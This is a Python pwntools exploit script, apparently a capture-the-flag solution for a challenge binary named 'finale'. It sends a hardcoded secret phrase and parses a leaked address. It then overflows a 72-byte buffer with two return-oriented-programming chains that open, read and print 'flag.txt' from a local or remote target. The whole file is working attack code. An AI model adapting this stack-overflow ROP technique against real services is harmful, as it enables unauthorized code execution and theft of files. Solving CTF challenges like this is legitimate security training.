#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, ROP, sys

context.binary = elf = ELF('finale_patched')


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'In order to proceed, tell us the secret phrase: ', b's34s0nf1n4l3b00')

    p.recvuntil(b'Season finale is here! Take this souvenir with you for good luck: [')
    addr = int(p.recvuntil(b']').decode()[:-1], 16)

    rop = ROP(elf)
    pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0]

    fd = 3
    offset = 72

    payload  = b'flag.txt'
    payload += b'\0' * (offset - len(payload))

    payload += p64(pop_rdi_ret)
    payload += p64(addr)
    payload += p64(pop_rsi_ret)
    payload += p64(0)
    payload += p64(elf.plt.open)

    payload += p64(elf.sym.finale)

    p.sendlineafter(b'Now, tell us a wish for next year: ', payload)

    payload  = b'A' * offset

    payload += p64(pop_rdi_ret)
    payload += p64(fd)
    payload += p64(pop_rsi_ret)
    payload += p64(addr)
    payload += p64(elf.plt.read)

    payload += p64(pop_rdi_ret)
    payload += p64(1)
    payload += p64(pop_rsi_ret)
    payload += p64(addr)
    payload += p64(elf.plt.write)

    p.sendlineafter(b'Now, tell us a wish for next year: ', payload)
    p.recvline()
    p.recvline()
    p.recvline()
    print(p.recvline())
    p.close()


if __name__ == '__main__':
    main()
